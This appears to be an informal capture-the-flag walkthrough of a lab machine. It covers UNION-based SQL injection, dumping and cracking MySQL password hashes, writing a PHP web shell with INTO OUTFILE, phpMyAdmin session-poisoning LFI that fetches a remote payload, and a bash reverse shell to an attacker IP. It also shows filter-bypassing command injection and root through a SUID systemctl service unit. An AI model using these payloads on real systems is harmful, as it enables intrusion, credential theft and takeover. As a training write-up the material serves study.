nmap shows ssh, port 80 and 64999 open.
Upon inspection, 64999 webpage doesnt allow us to do much.
gobuster doesnt give much
Mannual inspection shows a page with supposed IDOR
?cod=1
Tried with non-existing number, and seems like it is not IDOR, but an sqli
?cod=1'-- - or ?cod=1"-- - dint help
But ?cod=1-- - worked
So, we start with ORDER BY

#### Step 1
 Use ORDER BY to find number of columns
 ?cod=1 ORDER BY 1-- - all the way till ?cod=1 ORDER BY 8
 And so we find the table has 7 columns
 
#### Step 2
 Use UNION SELECT to find an injectable column
 Here, it is important we specify a non-existing value for ?cod
 ?cod=-1 UNION SELECT "1","2","3","4","5","6","7"
 Check for one of these numbers in the webpage, and that is the injectable column

#### Step 3
Extract the "all tables", database, tablename from the injectable column
?cod=-1 UNION SELECT "1","2","3",database(),"5","6","7"
?cod=-1 UNION SELECT "1","2","3",(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),"5","6","7"
--> we get hotel, information_schema, mysql, performance_schema

?cod=-1 UNION SELECT "1","2",(select+group_concat(table_name)+from+INFORMATION_SCHEMA.tables+WHERE+table_schema='hotel'),"4","5","6","7"
we got "room" table
cod=-1+UNION+SELECT+"1","2",(select+group_concat(column_name)+from+INFORMATION_SCHEMA.columns+WHERE+table_schema='hotel'),"4","5","6","7"
--> we got the columns, but nothing interesting there.

So we switch to the mysql table
cod=-1+UNION+SELECT+"1","2",(select+group_concat(column_name)+from+INFORMATION_SCHEMA.columns+WHERE+table_schema='mysql'),"4","5","6","7"

TIP - do group_concat(table_name,":",column_name,"\r\n") to make it prettier
NOTE- select host, user, password from mysql.user; this table maybe hidden

To get that,
cod=-1+UNION+SELECT+"1","2",(select+group_concat(host,user,password)+from+mysql.user),"4","5","6","7"
--> localhost:DBadmin:\*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
Hash Identifier says it is MySQL4.1/MySQL5, hashcat is -m 300
`hashcat -m 300 hash.txt /usr/share/wordlists/rockyou.txt`

---
OR, we can just drop a webshell into the file system and access it to call a shell
`http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7 into outfile '/var/www/html/hacked.txt'
this will write the content of /etc/passwd into the hacked.txt file

`http://10.10.10.143/room.php?cod=-1 union select 1,'<?php system($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'`

All that is left to do now is access the file, enter the command into the exec param using curl
`curl -X POST http://10.10.10.143/pwned.php --data-urlencode exec=whoami` to verify it worked
`curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=bash -c " bash -i >& /dev/tcp/10.10.14.34/1234 0>&1"'`

---
Alternatively, we can also use the LOAD_FILE funcntionality
cod=-1+UNION+SELECT+"1","2",load_file("/etc/passwd"),"4","5","6","7"--+-

Now, we search for a LFI to RCE for phpmyadmin, session poisoning
This says we can create a new query in the phpmyadmin page  
`'select '<?php system("{}") ?>'` once logged in, then copy the phpmyadmin session cookie, visit the session page using LFI
`http://10.129.234.145/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../var/lib/php/sessions/sess_rqkdbgp9911los37igc12di9apsmeu70`
That was the POC. for a shell, the sql query would be
`select '<?php include("http://10.10.14.34/rshell.php"); ?>'`
`select '<?php exec("wget http://10.10.14.34/rshell.php -O /var/www/html/rshell.php"); ?>'`
visit the sess_ page
then visit IP/rshell.php
www-data!

---
we had a sudo -l to run a script from pepper
it would take input for ip to ping it, and awas executed as system(ping 'IP')
That was a command injection, but characters like ;,& were blocked.
What wasnt blocked was $()
So, we did echo "whoami" > test.t
and gave the input for IP as `$(whoami)` and we see pepper
Then, we put a mkfifo rshell into a file, and give the ip input for the code as $(/tmp/rshell.sh)
We get pepper

---
Pepper has SUID on systemctl command
GTFO bins has a way to get root from it.
But making the service in tmp wasnt woring for me, so created service in pepper's home
```zsh systemctl
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "bash /home/pepper/rshell.sh"
[Install]
WantedBy=multi-user.target' > pwned.service
systemctl link /home/pepper/pwned.service
systemctl start pwsystemctl start pwned.service
```
root!